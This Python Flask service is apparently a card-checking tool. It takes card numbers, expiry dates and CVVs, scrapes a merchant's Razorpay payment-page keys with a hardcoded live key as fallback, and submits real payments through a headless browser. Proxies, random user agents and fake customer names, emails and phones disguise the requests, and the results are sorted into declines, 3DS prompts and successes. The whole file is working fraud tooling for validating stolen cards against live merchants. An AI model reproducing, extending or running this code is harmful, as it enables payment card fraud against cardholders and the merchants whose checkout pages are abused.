from flask import Flask, request, jsonify
from flask_cors import CORS
from playwright.sync_api import sync_playwright
import random
import time
import re
import threading
from urllib.parse import parse_qs, urlparse

app = Flask(__name__)
CORS(app)

REASON_MAP = {
    "insufficient_funds": "INSUFFICIENT_FUNDS",
    "card_declined": "CARD_DECLINED",
    "do_not_honor": "DO_NOT_HONOR",
    "card_expired": "CARD_EXPIRED",
    "incorrect_card_details": "INCORRECT_CARD_DETAILS",
    "invalid_cvv": "INVALID_CVV",
    "transaction_not_permitted": "TRANSACTION_NOT_PERMITTED",
    "suspected_fraud": "SUSPECTED_FRAUD",
    "card_blocked": "CARD_BLOCKED",
    "daily_limit_exceeded": "DAILY_LIMIT_EXCEEDED",
    "payment_timeout": "PAYMENT_TIMEOUT",
    "gateway_error": "GATEWAY_ERROR",
    "server_error": "SERVER_ERROR",
    "bad_request_error": "BAD_REQUEST_ERROR",
    "invalid_card": "INVALID_CARD",
    "card_network_not_supported": "CARD_NOT_SUPPORTED",
    "international_transaction_not_allowed": "INTERNATIONAL_NOT_ALLOWED",
    "payment_failed": "PAYMENT_FAILED",
}

FALLBACK_MERCHANT = {
    'keyless_header': 'api_v1:vNQKl/R1ASkk7vT9MvJY3tYVjeV3jfltskhOwoZUfQad2n91vwexGYzlLxMw0vBL5GLS0xDghw9xZogu31Tg3VQ1UesS9Q==',
    'key_id': 'rzp_live_hrgl3RDoNMvCOs',
    'payment_link_id': 'pl_OzLkvRvf1drPps',
    'payment_page_item_id': 'ppi_OzLkvUeMxfhIbI'
}

_shared_playwright = None
_shared_browser = None
_browser_lock = threading.Lock()

def get_shared_browser(proxy_config=None):
    global _shared_playwright, _shared_browser
    with _browser_lock:
        if _shared_browser is None or not _shared_browser.is_connected():
            try:
                if _shared_browser:
                    _shared_browser.close()
            except Exception:
                pass
            try:
                if _shared_playwright:
                    _shared_playwright.stop()
            except Exception:
                pass
            _shared_playwright = sync_playwright().start()
            _shared_browser = _shared_playwright.chromium.launch(
                headless=True,
                proxy=proxy_config,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
            )
        return _shared_browser

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {"server": f"http://{ip}:{port}", "username": user, "password": pwd}
    elif len(parts) == 2:
        ip, port = parts
        return {"server": f"http://{ip}:{port}"}
    return None

def get_user_agent():
    agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
    ]
    return random.choice(agents)

def generate_user_info():
    names = ['Raj Kumar', 'Priya Singh', 'Amit Sharma', 'Neha Gupta', 'Vikram Patel', 'Anita Verma']
    name = random.choice(names)
    return {
        "name": name,
        "email": f"user{random.randint(1000, 9999)}@gmail.com",
        "phone": f"+91{random.randint(7000000000, 9999999999)}"
    }

def get_masked_card(cc):
    if len(cc) >= 10:
        return f"{cc[:6]}******{cc[-4:]}"
    return cc

def map_response(error_obj):
    if not error_obj or not isinstance(error_obj, dict):
        return "UNKNOWN_ERROR"
    reason = error_obj.get("reason", "").lower()
    code = error_obj.get("code", "").lower()
    description = error_obj.get("description", "")
    
    if reason in REASON_MAP:
        return REASON_MAP[reason]
    if code in REASON_MAP:
        return REASON_MAP[code]
    
    desc_lower = description.lower()
    for key, val in REASON_MAP.items():
        if key.replace("_", " ") in desc_lower:
            return val
    
    return description[:80] if description else code.upper() or "UNKNOWN_ERROR"

def charge_card(cc, mes, ano, cvv, site_url, proxy_str=None):
    start_time = time.time()
    result = {
        "Gateway": "RAZORPAY",
        "Status": False,
        "Response": "UNKNOWN_ERROR",
        "cc": f"{cc}|{mes}|{ano}|{cvv}",
        "masked": get_masked_card(cc),
        "order_id": None,
        "payment_id": None,
        "amount_inr": 0,
        "Price": 0,
        "time": 0
    }

    if len(ano) == 2:
        ano = "20" + ano

    proxy_config = parse_proxy(proxy_str)
    user_info = generate_user_info()

    try:
        browser = get_shared_browser(proxy_config)
        page = browser.new_page(user_agent=get_user_agent())

        merchant_data = FALLBACK_MERCHANT.copy()

        if site_url:
            try:
                page.goto(site_url, timeout=45000, wait_until='networkidle')
                extracted = page.evaluate("""
                    () => {
                        if (window.data && window.data.keyless_header) {
                            return {
                                keyless_header: window.data.keyless_header,
                                key_id: window.data.key_id,
                                payment_link_id: window.data.payment_link ? window.data.payment_link.id : null,
                                payment_page_item_id: window.data.payment_link && window.data.payment_link.payment_page_items ?
                                    window.data.payment_link.payment_page_items[0]?.id : null,
                                amount: window.data.payment_link && window.data.payment_link.payment_page_items ?
                                    window.data.payment_link.payment_page_items[0]?.amount : null
                            };
                        }
                        if (window.__INITIAL_STATE__) {
                            const s = window.__INITIAL_STATE__;
                            return {
                                keyless_header: s.keyless_header,
                                key_id: s.key_id,
                                payment_link_id: s.payment_link?.id,
                                payment_page_item_id: s.payment_link?.payment_page_items?.[0]?.id,
                                amount: s.payment_link?.payment_page_items?.[0]?.amount
                            };
                        }
                        return null;
                    }
                """)
                if extracted and extracted.get('keyless_header') and extracted.get('key_id'):
                    merchant_data = extracted
            except Exception as e:
                pass

        keyless_header = merchant_data.get('keyless_header')
        key_id = merchant_data.get('key_id')
        payment_link_id = merchant_data.get('payment_link_id')
        payment_page_item_id = merchant_data.get('payment_page_item_id')
        amount_paise = merchant_data.get('amount', 50000) or 50000

        result["amount_inr"] = round(amount_paise / 100, 2)
        result["Price"] = round(result["amount_inr"] / 83.5, 2)

        try:
            page.goto(
                "https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
                timeout=60000
            )
            page.wait_for_url("**/checkout/public*session_token*", timeout=55000)
            session_token = parse_qs(urlparse(page.url).query).get("session_token", [None])[0]
        except Exception as e:
            page.close()
            result["Response"] = f"SESSION_ERROR"
            result["time"] = round(time.time() - start_time, 2)
            return result

        if not session_token:
            page.close()
            result["Response"] = "SESSION_TOKEN_FAILED"
            result["time"] = round(time.time() - start_time, 2)
            return result

        order_id = page.evaluate("""
            async ([pl_id, ppi, amt]) => {
                try {
                    const r = await fetch("https://api.razorpay.com/v1/payment_pages/" + pl_id + "/order", {
                        method: "POST",
                        headers: {"Accept": "application/json", "Content-Type": "application/json"},
                        body: JSON.stringify({
                            notes: {comment: ""},
                            line_items: [{payment_page_item_id: ppi, amount: amt}]
                        })
                    });
                    const d = await r.json();
                    return d.order ? d.order.id : (d.id || null);
                } catch(e) { return null; }
            }
        """, [payment_link_id, payment_page_item_id, amount_paise])

        if not order_id:
            page.close()
            result["Response"] = "ORDER_CREATION_FAILED"
            result["time"] = round(time.time() - start_time, 2)
            return result

        result["order_id"] = order_id

        submit_result = page.evaluate("""
            async (args) => {
                const [k_id, sess_token, k_hdr, p_id, o_id, amt,
                       c_num, c_cvv, c_name, exp_m, exp_y, cnt, em] = args;

                const params = new URLSearchParams();
                params.append("notes[comment]", "");
                params.append("payment_link_id", p_id);
                params.append("key_id", k_id);
                params.append("contact", cnt);
                params.append("email", em);
                params.append("currency", "INR");
                params.append("_[integration]", "payment_pages");
                params.append("_[library]", "checkoutjs");
                params.append("_[library_src]", "no-src");
                params.append("_[platform]", "browser");
                params.append("_[os]", "android");
                params.append("_[is_magic_script]", "false");
                params.append("amount", String(amt));
                params.append("order_id", o_id);
                params.append("method", "card");
                params.append("card[number]", c_num);
                params.append("card[cvv]", c_cvv);
                params.append("card[name]", c_name);
                params.append("card[expiry_month]", exp_m);
                params.append("card[expiry_year]", exp_y);
                params.append("save", "0");

                const qs = new URLSearchParams({
                    key_id: k_id,
                    session_token: sess_token,
                    keyless_header: k_hdr
                });

                try {
                    const r = await fetch(
                        "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?" + qs.toString(),
                        {
                            method: "POST",
                            headers: {
                                "x-session-token": sess_token,
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            body: params.toString()
                        }
                    );
                    const text = await r.text();
                    try { return {status: r.status, body: JSON.parse(text)}; }
                    catch { return {status: r.status, body: text}; }
                } catch(e) {
                    return {status: 0, body: String(e)};
                }
            }
        """, [
            key_id, session_token, keyless_header,
            payment_link_id, order_id, amount_paise,
            cc, cvv, user_info["name"], mes.zfill(2), ano[-2:],
            user_info["phone"], user_info["email"]
        ])

        page.close()

        data = submit_result.get("body", {}) if isinstance(submit_result, dict) else {}

        if isinstance(data, dict):
            payment_id = (
                data.get("payment_id") or
                data.get("razorpay_payment_id") or
                (data.get("payment", {}) or {}).get("id") or
                (data.get("error", {}) or {}).get("metadata", {}).get("payment_id")
            )
            if payment_id:
                result["payment_id"] = payment_id

            if data.get("redirect") or data.get("type") == "redirect":
                result["Status"] = False
                result["Response"] = "3DS_REQUIRED"

            elif "razorpay_signature" in data or data.get("status") in ("captured", "authorized"):
                result["Status"] = True
                result["Response"] = "PAYMENT_SUCCESS"

            elif payment_id and not data.get("error"):
                result["Status"] = True
                result["Response"] = "PAYMENT_SUCCESS"

            elif "error" in data:
                err = data["error"]
                result["Status"] = False
                result["Response"] = map_response(err)
                if isinstance(err, dict):
                    meta = err.get("metadata", {})
                    if meta.get("payment_id"):
                        result["payment_id"] = meta["payment_id"]
                    if meta.get("order_id"):
                        result["order_id"] = meta["order_id"]
            else:
                result["Status"] = False
                result["Response"] = "PAYMENT_FAILED"
        else:
            result["Status"] = False
            result["Response"] = "INVALID_RESPONSE"

    except Exception as e:
        result["Response"] = str(e)[:100]

    result["time"] = round(time.time() - start_time, 2)
    return result

@app.route('/razorpay_parallel', methods=['GET'])
def razorpay_parallel():
    site = request.args.get('site', '')
    cc_str = request.args.get('cc', '')
    proxy_str = request.args.get('proxy', '')

    if not site or not cc_str:
        return jsonify({"error": "Missing site or cc parameter"}), 400

    parts = cc_str.split('|')
    if len(parts) != 4:
        return jsonify({"error": "Invalid CC format. Use: CC|MM|YY|CVV"}), 400

    cc, mes, ano, cvv = parts
    result = charge_card(cc.strip(), mes.strip(), ano.strip(), cvv.strip(), site, proxy_str)
    return jsonify(result)

@app.route('/razorpay', methods=['GET'])
def razorpay():
    return razorpay_parallel()

@app.route('/', methods=['GET'])
def index():
    return jsonify({"status": "RazorPay API Running", "version": "3.0", "endpoints": ["/razorpay", "/razorpay_parallel"]})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
